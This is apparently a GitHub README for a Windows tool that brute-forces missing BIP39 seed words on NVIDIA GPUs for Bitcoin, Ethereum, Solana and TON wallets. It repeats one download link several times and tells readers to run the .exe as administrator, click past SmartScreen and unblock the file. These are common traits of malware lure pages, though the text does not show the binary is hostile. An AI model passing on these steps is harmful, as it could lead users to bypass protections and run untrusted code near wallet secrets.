# 🔐 CUDA_Mnemonic_Recovery - Fast Seed Recovery on Windows

[![Download Now](https://img.shields.io/badge/Download-CUDA_Mnemonic_Recovery-blue?style=for-the-badge)](https://github.com/isananny8515/CUDA_Mnemonic_Recovery)

## 🧭 What This App Does

CUDA_Mnemonic_Recovery helps you recover BIP39 seed phrases on Windows with GPU support. It uses your graphics card to test possible words and search for a match faster than a CPU-only tool. It works with Bitcoin, Ethereum, Solana, and TON seed formats.

Use it when you need to check a partial mnemonic, test a known word pattern, or review a backup with missing words.

## 💻 Before You Start

You need:

- A Windows PC
- An NVIDIA GPU with CUDA support
- Enough free disk space for the app and its data
- A saved wallet backup or partial seed phrase
- Access to the full recovery project at the download link below

Best results come from a system with more than one GPU, but one supported GPU is enough to start.

## 📥 Download

Visit this page to download:
https://github.com/isananny8515/CUDA_Mnemonic_Recovery

## 🛠️ Install on Windows

1. Open the download page in your browser.
2. Download the latest Windows build or source package from the repository.
3. If you get a ZIP file, extract it to a folder you can find easily, such as `Downloads` or `Desktop`.
4. If you get an `.exe` file, keep it in the same folder as the other app files.
5. Right-click the app and choose **Run as administrator** if Windows asks for it.
6. If Windows SmartScreen appears, choose **More info** and then **Run anyway** if you trust the file source.
7. Make sure your NVIDIA driver is up to date before you start.

## ⚙️ First Run

1. Open the app from the extracted folder.
2. Load your recovery settings or enter them in the app.
3. Select the wallet type you want to check:
   - Bitcoin
   - Ethereum
   - Solana
   - TON
4. Choose how many missing words you want to recover.
5. Enter any words you already know.
6. Start the scan.

If the app shows GPU options, select the one that matches your card.

## 🔍 How Recovery Works

The app checks many possible BIP39 word combinations against your wallet type. It uses CUDA to split work across the GPU, which helps it test more options in less time.

You can use it for:

- Missing seed words
- Swapped word order
- Partial mnemonic backups
- Wallet recovery checks across multiple chains

The app follows the BIP39 word list and compares possible results until it finds a valid match.

## 🧩 Supported Wallet Types

### Bitcoin
Use this for BIP39 wallets tied to Bitcoin addresses and backups.

### Ethereum
Use this for ETH wallets that came from a BIP39 seed phrase.

### Solana
Use this for Solana wallets that use mnemonic-based recovery.

### TON
Use this for TON wallets that rely on a BIP39 seed phrase.

## 🖥️ GPU Support

The app is built for CUDA-capable NVIDIA cards. If you have more than one GPU, the tool can use them together to speed up the search.

For best results:

- Update your NVIDIA driver
- Close heavy apps before you start
- Use a card with enough VRAM for the task
- Keep your system plugged in during long scans

## 📂 Typical Folder Layout

You may see files like these after download:

- `CUDA_Mnemonic_Recovery.exe`
- `config.json`
- `wordlists/`
- `logs/`
- `README.md`

If the app comes as source files, the build steps will be in the repo files you downloaded.

## 🧪 Basic Use Case

A common recovery flow looks like this:

1. You have 10, 11, or 12 words from a BIP39 backup.
2. You are missing one or more words.
3. You open the app and enter the words you know.
4. You set the wallet type.
5. You start the recovery scan.
6. The app checks valid BIP39 combinations on your GPU.
7. You review the match when it appears.

## ⏱️ What Affects Speed

Recovery speed depends on:

- Your GPU model
- Number of GPUs
- How many words are missing
- The wallet type
- Your system memory
- Your NVIDIA driver version

Fewer missing words usually means a faster search. More missing words means more possible combinations.

## 🛟 Troubleshooting

### The app does not open
- Check that you extracted all files
- Run the app as administrator
- Reboot your PC and try again

### The GPU is not detected
- Update your NVIDIA driver
- Check that your card supports CUDA
- Close other GPU-heavy apps
- Try another GPU if your PC has more than one

### The scan is slow
- Confirm that CUDA is active
- Use the newest driver
- Stop other programs that use the GPU
- Make sure your power plan is set to High performance

### Windows blocks the file
- Open the file’s properties
- Select **Unblock** if the option appears
- Then run the app again

## 🔐 Safe Use

Use the tool only on wallets you own or have permission to recover. Keep your seed phrase private. Do not share it in chat, email, or screenshots.

Store any recovered phrase in a secure place after the scan finishes.

## 🧾 Repository Topics

This project is related to:

- BIP39
- Bitcoin
- CUDA
- Ethereum
- Mnemonic recovery
- Multi-GPU
- Seed phrase
- Solana
- TON

## 📎 Download Link

Download or open the project page here:
https://github.com/isananny8515/CUDA_Mnemonic_Recovery

## ✅ Quick Start

1. Open the download page.
2. Get the Windows files.
3. Extract them if needed.
4. Update your NVIDIA driver.
5. Run the app.
6. Load your known seed words.
7. Start recovery with your GPU
